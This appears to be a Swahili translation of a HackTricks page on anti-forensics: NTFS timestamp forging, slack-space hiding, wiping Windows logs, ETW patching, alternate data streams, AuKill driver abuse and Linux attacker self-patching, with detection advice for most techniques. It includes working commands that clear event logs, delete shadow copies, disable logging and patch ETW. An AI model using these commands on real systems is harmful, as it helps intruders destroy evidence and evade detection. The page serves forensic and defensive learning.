# Mbinu za Anti-Forensic

## Mihuri ya muda

Mshambulizi anaweza kuwa na nia ya **kubadilisha mihuri ya muda ya faili** ili kuepuka kugunduliwa.\
Inawezekana kupata mihuri ya muda ndani ya MFT katika attributes `$STANDARD_INFORMATION` \_\_ na \_\_ `$FILE_NAME`.

Attributes zote mbili zina mihuri 4 ya muda: **Modification**, **access**, **creation**, na **MFT registry modification** (MACE au MACB).

**Windows explorer** na zana nyingine huonyesha taarifa kutoka kwa **`$STANDARD_INFORMATION`**.

### TimeStomp - Zana ya Anti-forensic

Zana hii **hubadilisha** taarifa za mihuri ya muda ndani ya **`$STANDARD_INFORMATION`** **lakini** **haibadilishi** taarifa zilizo ndani ya **`$FILE_NAME`**. Kwa hiyo, inawezekana **kutambua** shughuli **za kutiliwa shaka**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) ni kipengele cha NTFS (Windows NT file system) kinachofuatilia mabadiliko ya volume. Zana ya [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) inaruhusu kuchunguza mabadiliko haya.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) ni kipengele cha NTFS (Windows NT file system) kinachofuatilia mabadiliko ya volume. Zana hii...](<../../images/image (801).png>)

Picha iliyotangulia ni **matokeo** yaliyoonyeshwa na **zana**, ambapo inaweza kuonekana kuwa **mabadiliko fulani yalifanywa** kwenye faili.

### $LogFile

**Mabadiliko yote ya metadata kwenye file system huandikwa** katika mchakato unaojulikana kama [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Metadata iliyoandikwa huhifadhiwa katika faili inayoitwa `**$LogFile**`, iliyoko kwenye directory ya root ya NTFS file system. Zana kama [LogFileParser](https://github.com/jschicht/LogFileParser) zinaweza kutumiwa kuchanganua faili hii na kutambua mabadiliko.

![Usnjrnl - $LogFile: Mabadiliko yote ya metadata kwenye file system huandikwa katika mchakato unaojulikana kama write-ahead logging. Metadata iliyoandikwa huhifadhiwa katika faili inayoitwa $LogFile , iliyoko kwenye root...](<../../images/image (137).png>)

Tena, kwenye matokeo ya zana inawezekana kuona kuwa **mabadiliko fulani yalifanywa**.

Kwa kutumia zana hiyo hiyo, inawezekana kutambua **mihuri ya muda ilibadilishwa kuwa muda gani**:

![Usnjrnl - $LogFile: Kwa kutumia zana hiyo hiyo inawezekana kutambua mihuri ya muda ilibadilishwa kuwa muda gani](<../../images/image (1089).png>)

- CTIME: Muda wa kuundwa kwa faili
- ATIME: Muda wa kubadilishwa kwa faili
- MTIME: Mabadiliko ya registry ya MFT ya faili
- RTIME: Muda wa kufikiwa kwa faili

### Ulinganisho wa `$STANDARD_INFORMATION` na `$FILE_NAME`

Njia nyingine ya kutambua faili zilizobadilishwa kwa kutiliwa shaka ni kulinganisha muda katika attributes zote mbili na kutafuta **kutolingana**.

### Nanoseconds

Mihuri ya muda ya **NTFS** ina **usahihi** wa **nanoseconds 100**. Kwa hiyo, kupata faili zilizo na mihuri ya muda kama 2010-10-10 10:10:**00.000:0000 kunatia shaka sana**.

### SetMace - Zana ya Anti-forensic

Zana hii inaweza kubadilisha attributes zote mbili `$STARNDAR_INFORMATION` na `$FILE_NAME`. Hata hivyo, kuanzia Windows Vista, OS inayotumika inahitajika ili kubadilisha taarifa hizi.

## Kuficha Data

NFTS hutumia cluster na ukubwa wa chini wa taarifa. Hii inamaanisha kuwa ikiwa faili inatumia cluster moja na nusu, **nusu iliyobaki haitatumika kamwe** hadi faili lifutwe. Kwa hiyo, inawezekana **kuficha data katika slack space hii**.

Kuna zana kama slacker zinazoruhusu kuficha data katika nafasi hii "iliyofichwa". Hata hivyo, uchanganuzi wa `$logfile` na `$usnjrnl` unaweza kuonyesha kuwa data fulani iliongezwa:

![SetMace - Anti-forensic Tool - Data Hiding: Kuna zana kama slacker zinazoruhusu kuficha data katika nafasi hii "iliyofichwa". Hata hivyo, uchanganuzi wa $logfile na $usnjrnl unaweza kuonyesha kuwa...](<../../images/image (1060).png>)

Kisha, inawezekana kupata slack space kwa kutumia zana kama FTK Imager. Kumbuka kuwa aina hii ya zana inaweza kuhifadhi maudhui yakiwa yamefichwa au hata yamesimbwa kwa njia fiche.

## UsbKill

Hii ni zana ambayo **itazima kompyuta ikiwa mabadiliko yoyote kwenye** ports za **USB** yatagunduliwa.\
Njia ya kugundua hii ni kukagua michakato inayoendeshwa na **kukagua kila python script inayoendeshwa**.

## Live Linux Distributions

Distros hizi **huendeshwa ndani ya** memory ya **RAM**. Njia pekee ya kuzitambua ni **ikiwa NTFS file-system ime-mountiwa ikiwa na ruhusa za kuandika**. Ikiwa ime-mountiwa kwa ruhusa za kusoma pekee, haitawezekana kugundua intrusion.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Inawezekana kuzima mbinu kadhaa za Windows logging ili kufanya uchunguzi wa forensics kuwa mgumu zaidi.

### Disable Timestamps - UserAssist

Hii ni registry key inayohifadhi tarehe na saa ambazo kila executable iliendeshwa na mtumiaji.

Kuzima UserAssist kunahitaji hatua mbili:

1. Weka registry keys mbili, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` na `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, zote ziwe sifuri ili kuashiria kuwa tunataka UserAssist izimwe.
2. Futa registry subtrees zako zinazoonekana kama `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

Hii itahifadhi taarifa kuhusu applications zilizoendeshwa kwa lengo la kuboresha performance ya Windows system. Hata hivyo, taarifa hizi zinaweza pia kuwa muhimu kwa practices za forensics.

- Endesha `regedit`
- Chagua file path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Bofya kulia kwenye `EnablePrefetcher` na `EnableSuperfetch`
- Chagua Modify kwenye kila moja ili kubadilisha value kutoka 1 (au 3) hadi 0
- Restart

### Disable Timestamps - Last Access Time

Kila folder inapofunguliwa kutoka NTFS volume kwenye Windows NT server, system huchukua muda wa **kusasisha field ya timestamp kwenye kila folder iliyoorodheshwa**, inayoitwa last access time. Kwenye NTFS volume inayotumiwa sana, hii inaweza kuathiri performance.

1. Fungua Registry Editor (Regedit.exe).
2. Nenda kwenye `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Tafuta `NtfsDisableLastAccessUpdate`. Ikiwa haipo, ongeza DWORD hii na uweke value yake kuwa 1, ambayo itazima mchakato huo.
4. Funga Registry Editor, kisha u-reboot server.

### Delete USB History

**USB Device Entries** zote huhifadhiwa katika Windows Registry chini ya **USBSTOR** registry key, iliyo na sub keys zinazoundwa kila unapochomeka USB Device kwenye PC au Laptop yako. Unaweza kupata key hii hapa H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Kuifuta** kutafuta historia ya USB.\
Unaweza pia kutumia zana ya [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) ili kuhakikisha kuwa umezifuta (na kuzifuta).

Faili nyingine inayohifadhi taarifa kuhusu USB ni faili `setupapi.dev.log` iliyo ndani ya `C:\Windows\INF`. Hii pia inapaswa kufutwa.

### Disable Shadow Copies

**Orodhesha** shadow copies kwa `vssadmin list shadowstorage`\
**Yafute** kwa kuendesha `vssadmin delete shadow`

Unaweza pia kuyafuta kupitia GUI kwa kufuata hatua zilizopendekezwa kwenye [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Ili kuzima shadow copies, [fuata hatua hizi](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Fungua Services program kwa kuandika "services" kwenye kisanduku cha kutafuta maandishi baada ya kubofya kitufe cha Windows start.
2. Kwenye orodha, tafuta "Volume Shadow Copy", ichague, kisha ufikie Properties kwa kubofya kulia.
3. Chagua Disabled kwenye menyu kunjuzi ya "Startup type", kisha thibitisha mabadiliko kwa kubofya Apply na OK.

Pia inawezekana kubadilisha configuration ya faili zitakazonakiliwa katika shadow copy kwenye registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- Unaweza kutumia **Windows tool**: `cipher /w:C` Hii itaelekeza cipher kuondoa data yoyote kutoka disk space isiyotumika inayopatikana ndani ya C drive.
- Unaweza pia kutumia zana kama [**Eraser**](https://eraser.heidi.ie)

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Panua "Windows Logs" --> Bofya kulia kila category na uchague "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Ndani ya services section zima service ya "Windows Event Log"
- `WEvtUtil.exec clear-log` au `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Matoleo ya hivi karibuni ya Windows 10/11 na Windows Server huhifadhi **artifacts nyingi za PowerShell za forensics** chini ya
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
Washambuliaji wanaweza kuzima au kuzifuta wakati huo huo:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Defenders wanapaswa kufuatilia mabadiliko kwenye registry keys hizo na kuondolewa kwa wingi wa PowerShell events.

### ETW (Event Tracing for Windows) Patch

Endpoint security products hutegemea sana ETW. Njia maarufu ya 2024 ya evasion ni
kupatch `ntdll!EtwEventWrite`/`EtwEventWriteFull` in memory ili kila ETW call irudishe `STATUS_SUCCESS`
bila kutoa event:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (k.m. `EtwTiSwallow`) hutumia primitive hiyo hiyo katika PowerShell au C++.
Kwa sababu patch hiyo ni **process-local**, EDR zinazoendesha ndani ya process nyingine zinaweza kuikosa.<sup>[[5]](#references)</sup>
Detection: linganisha `ntdll` iliyo kwenye memory na iliyo kwenye disk, au weka hook kabla ya user-mode.

### Alternate Data Streams (ADS) Revival

Kampeni za malware za mwaka 2023 (k.m. **FIN12** loaders) zimeonekana zikiweka binaries za hatua ya pili
ndani ya ADS ili zisigunduliwe na scanners wa kawaida:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Orodhesha streams kwa `dir /R`, `Get-Item -Stream *`, au Sysinternals `streams64.exe`.
Kunakili host file kwenye FAT/exFAT au kupitia SMB kutaondoa stream iliyofichwa na kunaweza kutumiwa
na wachunguzi kurejesha payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver sasa hutumiwa mara kwa mara kwa **anti-forensics** katika mashambulizi ya ransomware.
Tool ya open-source **AuKill** hupakia driver iliyosainiwa lakini iliyo hatarini (`procexp152.sys`) ili
kusimamisha au kusitisha EDR na forensic sensors **kabla ya encryption & log destruction**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
The driver inaondolewa baadaye, na kuacha artifacts chache.<sup>[[1]](#references)</sup>
Hatua za kupunguza athari: washa Microsoft vulnerable-driver blocklist (HVCI/SAC),
na toa alert kuhusu uundaji wa kernel-service kutoka kwenye paths zinazoweza kuandikwa na mtumiaji.

---

## Linux Anti-Forensics: Self-Patching and Cloud C2 (2023–2025)

### Self-patching compromised services to reduce detection (Linux)
Adversaries wanazidi kufanya “self-patch” kwa service mara tu baada ya kui-exploit, ili kuzuia re-exploitation na pia kukandamiza vulnerability-based detections. Wazo ni kubadilisha components zilizo vulnerable kwa binaries/JARs halali za latest kutoka upstream, ili scanners ziripoti kuwa host imepatchiwa, huku persistence na C2 zikiendelea.<sup>[[3]](#references)</sup>

Example: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Baada ya post-exploitation, attackers walipakua JARs halali kutoka Maven Central (repo1.maven.org), wakafuta JARs zilizo vulnerable kwenye installation ya ActiveMQ, kisha wakarestart broker.
- Hii ilifunga RCE ya awali huku ikidumisha footholds nyingine (cron, mabadiliko ya SSH config, na C2 implants tofauti).

Mfano wa kiutendaji (wa kielelezo)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Vidokezo vya Forensic/hunting
- Kagua service directories kwa replacements za binary/JAR ambazo hazikupangwa:
- Debian/Ubuntu: `dpkg -V activemq` na linganisha file hashes/paths na repo mirrors.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Tafuta JAR versions zilizopo kwenye disk ambazo hazimilikiwi na package manager, au symbolic links zilizosasishwa nje ya utaratibu rasmi.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ili kuhusisha ctime/mtime na kipindi cha compromise.
- Shell history/process telemetry: ushahidi wa `curl`/`wget` kwenda `repo1.maven.org` au artifact CDNs nyingine mara tu baada ya initial exploitation.
- Change management: thibitisha ni nani aliyetumia “patch” na kwa nini, si kuthibitisha tu kwamba patched version ipo.

### Cloud-service C2 yenye bearer tokens na anti-analysis stagers
Tradecraft iliyobainika ilichanganya njia nyingi za long-haul C2 na anti-analysis packaging:<sup>[[3]](#references)</sup>
- Password-protected PyInstaller ELF loaders za kuzuia sandboxing na static analysis (kwa mfano, encrypted PYZ, temporary extraction chini ya `/_MEI*`).
- Indicators: `strings` hits kama `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: extraction kwenda `/tmp/_MEI*` au custom `--runtime-tmpdir` paths.
- Dropbox-backed C2 inayotumia hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` zenye `Authorization: Bearer <token>`.
- Fanya hunting kwenye proxy/NetFlow/Zeek/Suricata kwa outbound HTTPS kwenda Dropbox domains kutoka server workloads ambazo kwa kawaida hazisync files.
- Parallel/backup C2 kupitia tunneling (kwa mfano, Cloudflare Tunnel `cloudflared`), ili kudumisha control ikiwa channel moja imezuiwa.
- Host IOCs: `cloudflared` processes/units, config kwenye `~/.cloudflared/*.json`, outbound 443 kwenda Cloudflare edges.

### Persistence na “hardening rollback” za kudumisha access (mifano ya Linux)
Attackers mara nyingi huunganisha self-patching na durable access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron: edits kwenye `0anacron` stub katika kila `/etc/cron.*/` directory kwa ajili ya periodic execution.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: kuwezesha root logins na kubadilisha default shells za low-privileged accounts.
- Hunt kwa root login enablement:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt kwa suspicious interactive shells kwenye system accounts (kwa mfano, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Random, short-named beacon artifacts (zenye alphabetical chars 8) zilizodondoshwa kwenye disk ambazo pia huwasiliana na cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders wanapaswa kuhusisha artifacts hizi na external exposure pamoja na matukio ya service patching ili kugundua anti-forensic self-remediation iliyotumiwa kuficha initial exploitation.

## References

- [1] [Sophos X-Ops – AuKill: Driver yenye udhaifu iliyotengenezwa kwa silaha kwa ajili ya kuzima EDR (Machi 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Kupatch EtwEventWrite kwa Stealth: Detection & Hunting (Juni 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Kupatch kwa persistence: Jinsi Linux malware ya DripDropper inavyosambaa kwenye cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Kuficha .NET yako - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
